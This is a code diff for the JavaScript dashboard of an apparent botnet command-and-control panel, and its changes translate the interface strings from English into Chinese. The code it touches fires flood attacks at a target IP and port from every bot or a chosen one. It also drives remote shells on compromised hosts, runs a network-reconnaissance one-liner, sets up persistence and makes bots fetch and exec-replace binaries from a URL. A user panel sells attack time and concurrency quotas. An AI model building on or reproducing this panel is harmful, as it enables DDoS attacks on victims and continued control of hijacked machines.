-    '<div class="isb-row"><span class="isb-label">Process</span><span class="isb-val">' + escHtml(b.processName) + '</span></div>' +
+    '<div class="isb-row"><span class="isb-label">内存大小</span><span class="isb-val">' + formatRAM(b.ram) + '</span></div>' +
+    '<div class="isb-row"><span class="isb-label">CPU核心数</span><span class="isb-val">' + b.cpuCores + '</span></div>' +
+    '<div class="isb-row"><span class="isb-label">进程名称</span><span class="isb-val">' + escHtml(b.processName) + '</span></div>' +
     '<div class="isb-divider"></div>' +
-    '<div class="isb-row"><span class="isb-label">Uptime</span><span class="isb-val">' + escHtml(b.uptime) + '</span></div>' +
-    '<div class="isb-row"><span class="isb-label">Last Ping</span><span class="isb-val">' + ago(b.lastPing) + '</span></div>' +
+    '<div class="isb-row"><span class="isb-label">运行时间</span><span class="isb-val">' + escHtml(b.uptime) + '</span></div>' +
+    '<div class="isb-row"><span class="isb-label">最近心跳</span><span class="isb-val">' + ago(b.lastPing) + '</span></div>' +
     '<div class="isb-divider"></div>' +
-    '<div class="isb-row"><span class="isb-label">SOCKS</span><span class="isb-val" style="color:' + (b.socksActive ? 'var(--green)' : 'var(--text-dim)') + '">' + (b.socksActive ? 'ON' : 'OFF') + '</span></div>' +
-    (b.socksActive && b.socksRelay ? '<div class="isb-row"><span class="isb-label">Relay</span><span class="isb-val" style="color:var(--accent)">' + escHtml(b.socksRelay) + '</span></div>' : '');
+    '<div class="isb-row"><span class="isb-label">SOCKS代理</span><span class="isb-val" style="color:' + (b.socksActive ? 'var(--green)' : 'var(--text-dim)') + '">' + (b.socksActive ? 'ON' : 'OFF') + '</span></div>' +
+    (b.socksActive && b.socksRelay ? '<div class="isb-row"><span class="isb-label">中继节点</span><span class="isb-val" style="color:var(--accent)">' + escHtml(b.socksRelay) + '</span></div>' : '');
 }
 
 // ---------------------------------------------------------------------------
@@ -2309,14 +2310,14 @@ function navigateTabComplete(dir) {
 
 function copyShellOutput() {
   var text = document.getElementById('shell-output').textContent;
-  if (!text) { showToast('Nothing to copy', false); return; }
-  navigator.clipboard.writeText(text).then(function () { showToast('Output copied to clipboard', true); })
-    .catch(function () { showToast('Copy failed', false); });
+  if (!text) { showToast('没有可复制的内容', false); return; }
+  navigator.clipboard.writeText(text).then(function () { showToast('终端输出已复制到剪贴板', true); })
+    .catch(function () { showToast('复制失败', false); });
 }
 
 function saveShellHistory() {
   var content = document.getElementById('shell-output').textContent;
-  if (!content) { showToast('Nothing to save', false); return; }
+  if (!content) { showToast('没有可保存的内容', false); return; }
   var blob = new Blob([content], { type: 'text/plain' });
   var a = document.createElement('a');
   a.href = URL.createObjectURL(blob);
@@ -2326,7 +2327,7 @@ function saveShellHistory() {
 
 function clearShellHistory() {
   document.getElementById('shell-output').innerHTML = '';
-  document.getElementById('file-list').innerHTML = '<div class="file-empty">Send a command to populate</div>';
+  document.getElementById('file-list').innerHTML = '<div class="file-empty">执行命令后自动更新目录</div>';
   shellHistory = []; shellHistIdx = 0; shellCwd = '~'; shellCmdLog = [];
   document.getElementById('shell-prompt').textContent = '~$ ';
   updateBreadcrumb();
@@ -2342,7 +2343,7 @@ function shellZoom(delta) {
 }
 
 function shellNetScan() {
-  if (!shellWS || shellWS.readyState !== 1) { showToast('Not connected', false); return; }
+  if (!shellWS || shellWS.readyState !== 1) { showToast('未连接', false); return; }
   var cmd = 'echo "=== INTERFACES ===" && ip -4 addr show 2>/dev/null || ifconfig 2>/dev/null && echo "=== ROUTES ===" && ip route 2>/dev/null || route -n 2>/dev/null && echo "=== ARP ===" && ip neigh 2>/dev/null || arp -a 2>/dev/null && echo "=== LISTENERS ===" && ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null';
   shellSendCmd(cmd);
 }
@@ -2493,7 +2494,7 @@ function buildToolkitMenu() {
     });
     html += '</div></div>';
   });
-  body.innerHTML = html || '<div style="padding:16px;text-align:center;color:var(--text-dim);font-size:12px">No matches</div>';
+  body.innerHTML = html || '<div style="padding:16px;text-align:center;color:var(--text-dim);font-size:12px">未找到匹配项</div>';
 }
 
 function toggleToolkit() {
@@ -2685,7 +2686,7 @@ function refreshAll() {
   fetch('/api/stats').then(function (r) { return r.json(); }).then(updateStats).catch(function () { });
   fetch('/api/bots').then(function (r) { return r.json(); }).then(updateBots).catch(function () { });
   fetch('/api/activity').then(function (r) { return r.json(); }).then(function (entries) { renderActivityFull(entries); }).catch(function () { });
-  showToast('Refreshed', true);
+  showToast('已刷新数据', true);
 }
 
 function toggleCompactMode() {
@@ -2737,7 +2738,7 @@ function switchCmdCat(btn) {
 function clearCmdTarget() {
   var inp = document.getElementById('cmd-bot');
   inp.value = '';
-  inp.placeholder = 'all bots';
+  inp.placeholder = '所有主机';
   document.getElementById('cmd-target-clear').style.display = 'none';
 }
 
@@ -2749,7 +2750,7 @@ function targetBot(botID) {
   document.getElementById('cmd-target-clear').style.display = '';
   inp.classList.add('cmd-target-flash');
   setTimeout(function () { inp.classList.remove('cmd-target-flash'); }, 600);
-  showToast('Targeting ' + botID, true);
+  showToast('已锁定目标主机: ' + botID, true);
 }
 
 // init category filter on load
@@ -2827,7 +2828,7 @@ function updateAtkMethodInfo() {
   if (!optsDiv) return;
   optsDiv.innerHTML = '';
   if (!m || !m.options || m.options.length === 0) {
-    optsDiv.innerHTML = '<div style="opacity:0.5;padding:8px">No advanced options for this method</div>';
+    optsDiv.innerHTML = '<div style="opacity:0.5;padding:8px">该方法无高级选项</div>';
     return;
   }
   m.options.forEach(function (o) {
@@ -2899,7 +2900,7 @@ function showConfirm(opts) {
     detailsHtml +
     '</div>' +
     '<div class="confirm-footer">' +
-    '<button class="confirm-btn confirm-btn-cancel" id="confirm-cancel">Cancel</button>' +
+    '<button class="confirm-btn confirm-btn-cancel" id="confirm-cancel">取消</button>' +
     '<button class="confirm-btn confirm-btn-' + btnClass + '" id="confirm-ok">' +
     escHtml(opts.confirmText || 'Confirm') +
     '</button>' +
@@ -2952,7 +2953,7 @@ function showUrlInput(opts) {
       'placeholder="' + escHtml(opts.placeholder || 'https://') + '" autocomplete="off" spellcheck="false">' +
     '</div>' +
     '<div class="confirm-footer">' +
-    '<button class="confirm-btn confirm-btn-cancel" id="confirm-cancel">Cancel</button>' +
+    '<button class="confirm-btn confirm-btn-cancel" id="confirm-cancel">取消</button>' +
     '<button class="confirm-btn confirm-btn-' + btnClass + '" id="confirm-ok">' +
     escHtml(opts.confirmText || 'Send') +
     '</button>' +
@@ -2994,11 +2995,11 @@ function showUrlInput(opts) {
 
 function popupPersist(botID) {
   showUrlInput({
-    title: 'Persist',
-    message: 'Optional: URL to fetch binary/script as fallback if the bot\'s binary is unreadable on disk. Leave blank to copy the running binary.',
-    placeholder: 'https://host/bot.elf  (optional)',
+    title: '配置持久化自启',
+    message: '可选: 若磁盘无法读取程序文件，可提供备用下载URL。留空则直接复制当前内存/磁盘运行中的程序。',
+    placeholder: 'https://host/bot.elf (可选)',
     required: false,
-    confirmText: 'Persist',
+    confirmText: '确认配置',
     icon: 'warn',
     confirmClass: 'ok',
     onConfirm: function (url) {
@@ -3009,11 +3010,11 @@ function popupPersist(botID) {
 
 function popupReinstall(botID) {
   showUrlInput({
-    title: 'Reinstall',
-    message: 'URL of ELF binary or shell script to fetch. The bot will download it, write to a temp file, and exec-replace itself.',
+    title: '重装/热替换程序',
+    message: '要拉取的ELF程序或Shell脚本URL。主机下载后将写入临时路径并替换当前进程运行。',
     placeholder: 'https://host/bot.elf',
     required: true,
-    confirmText: 'Reinstall',
+    confirmText: '确认重装',
     icon: 'warn',
     confirmClass: 'danger',
     onConfirm: function (url) {
@@ -3029,8 +3030,8 @@ function fireAttack() {
   var duration = document.getElementById('atk-duration').value.trim() || '30';
   var botID = document.getElementById('atk-bot').value.trim();
 
-  if (!target) { showToast('Enter a target IP', false); return; }
-  if (!method) { showToast('Select a method', false); return; }
+  if (!target) { showToast('请输入目标IP地址', false); return; }
+  if (!method) { showToast('请选择攻击方式', false); return; }
 
   // Build command: !method target port duration [key=val ...]
   var cmd = '!' + method + ' ' + target + ' ' + port + ' ' + duration;
@@ -3045,19 +3046,19 @@ function fireAttack() {
 
   var m = atkMethods.find(function (x) { return x.id === method; });
   var mName = m ? m.name : method;
-  var scope = botID ? 'Bot: ' + botID : 'ALL bots';
+  var scope = botID ? '主机: ' + botID : '全部主机';
 
   showConfirm({
-    title: 'Launch Attack',
-    message: 'You are about to fire an attack with the following parameters:',
+    title: '发起攻击测试',
+    message: '即将下发以下参数的攻击测试指令：',
     icon: 'danger',
     details: [
-      { label: 'Method', val: mName },
-      { label: 'Target', val: target + ':' + port },
-      { label: 'Duration', val: duration + 's' },
-      { label: 'Scope', val: scope }
+      { label: '攻击方法', val: mName },
+      { label: '目标地址', val: target + ':' + port },
+      { label: '持续时间', val: duration + '秒' },
+      { label: '执行范围', val: scope }
     ],
-    confirmText: 'Fire',
+    confirmText: '立即发起',
     confirmClass: 'danger',
     onConfirm: function () {
       fetch('/api/command', {
@@ -3067,7 +3068,7 @@ function fireAttack() {
       })
         .then(function (r) { return r.json(); })
         .then(function (d) { showToast(d.message, d.success); })
-        .catch(function () { showToast('Attack request failed', false); });
+        .catch(function () { showToast('发起攻击请求失败', false); });
     }
   });
 }
@@ -3077,13 +3078,13 @@ function stopAttack() {
   var scope = botID || 'ALL bots';
 
   showConfirm({
-    title: 'Stop Attacks',
-    message: 'This will immediately stop all running attacks.',
+    title: '停止所有攻击',
+    message: '将立即中止所有正在进行的攻击测试。',
     icon: 'warn',
     details: [
-      { label: 'Scope', val: scope }
+      { label: '执行范围', val: scope }
     ],
-    confirmText: 'Stop All',
+    confirmText: '全部停止',
     confirmClass: 'warn',
     onConfirm: function () {
       fetch('/api/command', {
@@ -3093,7 +3094,7 @@ function stopAttack() {
       })
         .then(function (r) { return r.json(); })
         .then(function (d) { showToast(d.message, d.success); })
-        .catch(function () { showToast('Stop request failed', false); });
+        .catch(function () { showToast('停止请求失败', false); });
     }
   });
 }
@@ -3108,13 +3109,13 @@ function loadUsers() {
   fetch('/api/users').then(function (r) { return r.json(); }).then(function (users) {
     usersData = users;
     renderUserCards(users);
-  }).catch(function () { showToast('Failed to load users', false); });
+  }).catch(function () { showToast('加载用户列表失败', false); });
 }
 
 function renderUserCards(users) {
   var grid = document.getElementById('users-grid');
   if (!users || !users.length) {
-    grid.innerHTML = '<div class="no-bots">No users found</div>';
+    grid.innerHTML = '<div class="no-bots">未找到用户</div>';
     return;
   }
   grid.innerHTML = users.map(function (u) {
@@ -3128,23 +3129,23 @@ function renderUserCards(users) {
       '<span class="uc-level ' + levelClass + '">' + escHtml(u.level) + '</span>' +
       '</div>' +
       '<div class="uc-body">' +
-      '<div class="uc-field"><span class="uc-label">Password</span><span class="uc-val">' + escHtml(u.password) + '</span></div>' +
-      '<div class="uc-field"><span class="uc-label">Expires</span><span class="uc-val' + (expired ? ' uc-expired' : '') + '">' + escHtml(u.expire) + (expired ? ' (expired)' : '') + '</span></div>' +
-      '<div class="uc-field"><span class="uc-label">Max Time</span><span class="uc-val">' + u.maxtime + 's</span></div>' +
-      '<div class="uc-field"><span class="uc-label">Concurrents</span><span class="uc-val">' + u.concurrents + '</span></div>' +
-      '<div class="uc-field"><span class="uc-label">Max Bots</span><span class="uc-val">' + botsStr + '</span></div>' +
-      '<div class="uc-field uc-field-full"><span class="uc-label">Methods</span><span class="uc-val uc-methods">' + escHtml(methods) + '</span></div>' +
+      '<div class="uc-field"><span class="uc-label">密码</span><span class="uc-val">' + escHtml(u.password) + '</span></div>' +
+      '<div class="uc-field"><span class="uc-label">到期时间</span><span class="uc-val' + (expired ? ' uc-expired' : '') + '">' + escHtml(u.expire) + (expired ? ' (expired)' : '') + '</span></div>' +
+      '<div class="uc-field"><span class="uc-label">单次最长</span><span class="uc-val">' + u.maxtime + 's</span></div>' +
+      '<div class="uc-field"><span class="uc-label">并发限制</span><span class="uc-val">' + u.concurrents + '</span></div>' +
+      '<div class="uc-field"><span class="uc-label">最大主机数</span><span class="uc-val">' + botsStr + '</span></div>' +
+      '<div class="uc-field uc-field-full"><span class="uc-label">允许方法</span><span class="uc-val uc-methods">' + escHtml(methods) + '</span></div>' +
       '</div>' +
       '<div class="uc-actions">' +
-      '<button class="uc-btn uc-edit" onclick="editUser(\'' + escHtml(u.username) + '\')">Edit</button>' +
-      '<button class="uc-btn uc-delete" onclick="deleteUser(\'' + escHtml(u.username) + '\')">Delete</button>' +
+      '<button class="uc-btn uc-edit" onclick="editUser(\'' + escHtml(u.username) + '\')">编辑</button>' +
+      '<button class="uc-btn uc-delete" onclick="deleteUser(\'' + escHtml(u.username) + '\')">删除</button>' +
       '</div>' +
       '</div>';
   }).join('');
 }
 
 function showAddUserForm() {
-  document.getElementById('user-form-title').textContent = 'Add User';
+  document.getElementById('user-form-title').textContent = '添加用户';
   document.getElementById('uf-editing').value = '';
   document.getElementById('uf-username').value = '';
   document.getElementById('uf-username').disabled = false;
@@ -3162,7 +3163,7 @@ function showAddUserForm() {
 function editUser(username) {
   var u = usersData.find(function (x) { return x.username === username; });
   if (!u) return;
-  document.getElementById('user-form-title').textContent = 'Edit User';
+  document.getElementById('user-form-title').textContent = '编辑用户';
   document.getElementById('uf-editing').value = username;
   document.getElementById('uf-username').value = u.username;
   document.getElementById('uf-username').disabled = true;
@@ -3193,7 +3194,7 @@ function saveUser() {
   var methods = methodsStr ? methodsStr.split(',').map(function (m) { return m.trim(); }).filter(Boolean) : [];
 
   if (!username || !password) {
-    showToast('Username and password required', false);
+    showToast('必须提供用户名和密码', false);
     return;
   }
 
@@ -3217,18 +3218,18 @@ function saveUser() {
     .then(function (r) { return r.json(); })
     .then(function (d) {
       if (d.success) {
-        showToast(editing ? 'User updated' : 'User created', true);
+        showToast(editing ? '用户更新成功' : '用户创建成功', true);
         hideUserForm();
         loadUsers();
       } else {
-        showToast(d.error || 'Failed', false);
+        showToast(d.error || '操作失败', false);
       }
     })
-    .catch(function () { showToast('Request failed', false); });
+    .catch(function () { showToast('请求失败', false); });
 }
 
 function deleteUser(username) {
-  if (!confirm('Delete user "' + username + '"?')) return;
+  if (!confirm('确定删除用户 "' + username + '"？')) return;
   fetch('/api/users', {
     method: 'DELETE',
     headers: { 'Content-Type': 'application/json' },
@@ -3237,13 +3238,13 @@ function deleteUser(username) {
     .then(function (r) { return r.json(); })
     .then(function (d) {
       if (d.success) {
-        showToast('User deleted', true);
+        showToast('用户已删除', true);
         loadUsers();
       } else {
-        showToast(d.error || 'Failed', false);
+        showToast(d.error || '操作失败', false);
       }
     })
-    .catch(function () { showToast('Delete failed', false); });
+    .catch(function () { showToast('删除失败', false); });
 }
 
 // ---------------------------------------------------------------------------
@@ -3354,7 +3355,7 @@ function loadLiveAttacks() {
     if (!list) return;
     count.textContent = attacks.length;
     if (!attacks.length) {
-      list.innerHTML = '<div style="color:var(--text-dim);padding:12px;font-size:13px">No active attacks</div>';
+      list.innerHTML = '<div style="color:var(--text-dim);padding:12px;font-size:13px">暂无正在进行的攻击</div>';
       return;
     }
     list.innerHTML = attacks.map(function(a) {
@@ -3386,10 +3387,10 @@ function loadTasks() {
     if (count) count.textContent = tasks.length;
     if (tabCount) tabCount.textContent = tasks.length;
     if (!tasks.length) {
-      wrap.innerHTML = '<div class="task-empty">No active tasks</div>';
+      wrap.innerHTML = '<div class="task-empty">暂无活跃任务</div>';
       return;
     }
-    var html = '<table class="task-table"><thead><tr><th>#</th><th>Command</th><th>Target</th><th>Status</th><th>Result</th><th>Time</th></tr></thead><tbody>';
+    var html = '<table class="task-table"><thead><tr><th>序号</th><th>命令</th><th>目标</th><th>状态</th><th>执行结果</th><th>时间</th></tr></thead><tbody>';
     tasks.forEach(function(t) {
       var statusClass = t.status === 'sent' ? 'ok' : t.status === 'failed' ? 'err' : '';
       var time = t.createdAt ? new Date(t.createdAt).toLocaleTimeString() : '';
@@ -3412,9 +3413,9 @@ function addTask() {
     headers: {'Content-Type':'application/json'},
     body: JSON.stringify({command: full, botID: ''})
   }).then(function(r){return r.json();}).then(function(d) {
-    if (d.success) { showToast('Task created: ' + (d.task.result || ''), true); loadTasks(); }
+    if (d.success) { showToast('任务已创建: ' + (d.task.result || ''), true); loadTasks(); }
     else showToast(d.message || 'Failed', false);
-  }).catch(function(){ showToast('Request failed', false); });
+  }).catch(function(){ showToast('请求失败', false); });
 }
 
 function updateTaskArgFields() {
@@ -3431,7 +3432,7 @@ function updateTaskArgFields() {
     '!lolnogtfo': []
   };
   var f = fields[cmd] || [];
-  if (!f.length) { container.innerHTML = '<span style="color:var(--text-dim);font-size:12px">No arguments</span>'; return; }
+  if (!f.length) { container.innerHTML = '<span style="color:var(--text-dim);font-size:12px">无附加参数</span>'; return; }
   container.innerHTML = f.map(function(a) {
     return '<input type="text" placeholder="' + (a.placeholder||'') + '" style="' + (a.style||'') + '" autocomplete="off" spellcheck="false">';
   }).join('');
@@ -3464,10 +3465,10 @@ function wizardInit() {
 }
 
 function wizardNext() {
-  if (wizState.step === 1 && !wizState.method) { showToast('Select a method', false); return; }
+  if (wizState.step === 1 && !wizState.method) { showToast('请选择攻击方式', false); return; }
   if (wizState.step === 2) {
     var t = document.getElementById('wiz-target').value.trim();
-    if (!t) { showToast('Enter a target IP', false); return; }
+    if (!t) { showToast('请输入目标IP地址', false); return; }
   }
   wizState.step = Math.min(wizState.step + 1, 3);
   renderWizStep();
@@ -3498,10 +3499,10 @@ function renderWizReview() {
   var port = document.getElementById('wiz-port').value.trim() || '80';
   var dur = parseInt(document.getElementById('wiz-duration-val').value) || 120;
   var bot = (document.getElementById('wiz-bot-target') || {}).value || '';
-  var html = '<div class="wr-row"><span class="wr-label">Method</span><span class="wr-value">' + escHtml(wizState.method.name) + '</span></div>' +
-    '<div class="wr-row"><span class="wr-label">Target</span><span class="wr-value">' + escHtml(target) + ':' + escHtml(port) + '</span></div>' +
-    '<div class="wr-row"><span class="wr-label">Duration</span><span class="wr-value">' + dur + 's</span></div>' +
-    '<div class="wr-row"><span class="wr-label">Scope</span><span class="wr-value">' + (bot || 'ALL bots') + '</span></div>';
+  var html = '<div class="wr-row"><span class="wr-label">攻击方法</span><span class="wr-value">' + escHtml(wizState.method.name) + '</span></div>' +
+    '<div class="wr-row"><span class="wr-label">目标地址</span><span class="wr-value">' + escHtml(target) + ':' + escHtml(port) + '</span></div>' +
+    '<div class="wr-row"><span class="wr-label">持续时间</span><span class="wr-value">' + dur + 's</span></div>' +
+    '<div class="wr-row"><span class="wr-label">攻击范围</span><span class="wr-value">' + (bot || 'ALL bots') + '</span></div>';
   r.innerHTML = html;
 }
 
@@ -3515,9 +3516,9 @@ function wizardLaunch() {
     method: 'POST', headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ command: cmd, botID: bot })
   }).then(function(r) { return r.json(); }).then(function(d) {
-    if (d.success) { showToast('Attack launched: ' + d.message, true); wizState.step = 1; wizState.method = null; renderWizStep(); wizardInit(); }
+    if (d.success) { showToast('攻击已发起: ' + d.message, true); wizState.step = 1; wizState.method = null; renderWizStep(); wizardInit(); }
     else showToast(d.message || 'Failed', false);
-  }).catch(function() { showToast('Request failed', false); });
+  }).catch(function() { showToast('请求失败', false); });
 }
 
 wizardInit();
